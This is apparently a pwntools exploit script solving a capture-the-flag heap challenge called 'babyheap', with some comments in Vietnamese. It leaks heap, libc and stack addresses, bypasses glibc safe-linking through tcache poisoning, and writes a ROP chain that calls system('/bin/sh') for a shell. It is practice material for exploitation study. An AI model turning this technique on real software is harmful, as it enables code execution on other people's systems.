#!/usr/bin/python3

from pwn import *

exe = ELF('babyheap_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda p, data: p.send(data)
sa = lambda p, msg, data: p.sendafter(msg, data)
sl = lambda p, data: p.sendline(data)
sla = lambda p, msg, data: p.sendlineafter(msg, data)
sn = lambda p, num: p.send(str(num).encode())
sna = lambda p, msg, num: p.sendafter(msg, str(num).encode())
sln = lambda p, num: p.sendline(str(num).encode())
slna = lambda p, msg, num: p.sendlineafter(msg, str(num).encode())

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        brva 0x1359
        brva 0x151A
        c
        ''')
        input()


if args.REMOTE:
    p = remote('')
else:
    p = process([exe.path])

def create(idx, payload):
    sla(p, b"> ", b"1")
    sla(p, b"Index? ", b"%d" % idx)
    sa(p, b"Content? Content? ", payload)

def read(idx):
    sla(p, b"> ", b"2")
    sla(p, b"Index? ", b"%d" % idx)

def update(idx, payload):
    sla(p, b"> ", b"3")
    sla(p, b"Index? ", b"%d" % idx)
    sla(p, b"Content? ", payload)

def delete(idx):
    sla(p, b"> ", b"4")
    sla(p, b"Index? ", b"%d" % idx)

# for i in range(10):
#     create(i, b"A" * 0x20)
# for i in range(10):
#     delete(i)
# delete(8)

create(0, b"A" * 0x20)
create(1, b"B" * 0x20)
create(2, b"C" * 0x20)
delete(0)
delete(2)
read(0)
heap = u64(p.recv(6).ljust(8, b"\x00")) << 12
info("Heap: " + hex(heap))

update(2, p64((heap + 0x290) ^ (heap >> 12))) #fake fd
create(3, b"D" * 0x20) 
create(4, p64(0) + p64(0x431)) #fake size 

delete(1)
delete(2)
update(2, p64((heap + 0x290 + 0x430) ^ (heap >> 12))) #fake fd

create(5, b'5')
# bypassing the check of free unsorted chunk with migration unsortedbin, because it checks a next and next_next chunk
create(6, flat(
    0, 0x21,
    0, 0,
    0, 0x21,
))
GDB()
delete(0)
read(0)
libc.address = u64(p.recv(6).ljust(8, b"\x00")) - 0x203b20
info("Libc: " + hex(libc.address))
info("Libc environ: " + hex(libc.sym.environ))
create(7, b'7')
create(8, b'8')
create(9, b'9')

delete(7)
delete(9)
# cơ chế mới chỉ chấp nhật fd kết thúc bằng 0 chứ không kết thúc bằng 8
update(9, p64((libc.sym.environ - 0x18) ^ (heap >> 12)))

create(11, b'11')
create(12, b'A' * 0x18)
read(12)
p.recvuntil(b'A' * 0x18)
stack_leak = u64(p.recv(6).ljust(8, b"\x00"))
info("Stack leak: " + hex(stack_leak))
# GDB()
create(13, b'13')
create(14, b'14')

delete(13)
delete(14)

rop = ROP(libc)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = pop_rdi + 1

update(14, p64((stack_leak - 0x158) ^ (heap >> 12)))
create(15, b'1')
## nhảy vào leave, ret của hàm create_chunk luôn
create(16, flat(
    0,
    pop_rdi,
    next(libc.search(b'/bin/sh\x00')),
    ret,
    libc.sym.system
))
p.interactive()
